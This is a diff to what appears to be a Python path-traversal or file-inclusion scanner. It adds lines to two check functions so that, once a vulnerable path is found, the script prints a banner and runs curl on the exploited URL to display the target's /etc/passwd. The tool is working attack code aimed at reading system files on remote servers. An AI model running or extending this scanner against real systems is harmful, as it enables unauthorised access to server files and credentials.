@@ -16,6 +16,8 @@ def check(url,payload,tmp,tmp1,s=0):
         if response.status_code == 200:
             if lastc.fi(full_url):
                 print("\033[1;31m[Success]Path found:{}\033[0m".format(full_url))
+                print("\033[1;34m----------*Contents of /etc/passwd*----------\033[0m")
+                subprocess.run(["curl", "-i", full_url])
                 return True
                 break
     if response.status_code != 200:
@@ -33,6 +35,8 @@ def check_ad(di,url,payload,tmp,s=0):
         if response.status_code == 200:
             if lastc.fi(full_url):
                 print("\033[1;31m[Success]Path found:{}\033[0m".format(full_url))
+                print("\033[1;34m----------*Contents of /etc/passwd*----------\033[0m")
+                subprocess.run(["curl", "-i", full_url])
                 return True
                 break
     if response.status_code != 200:
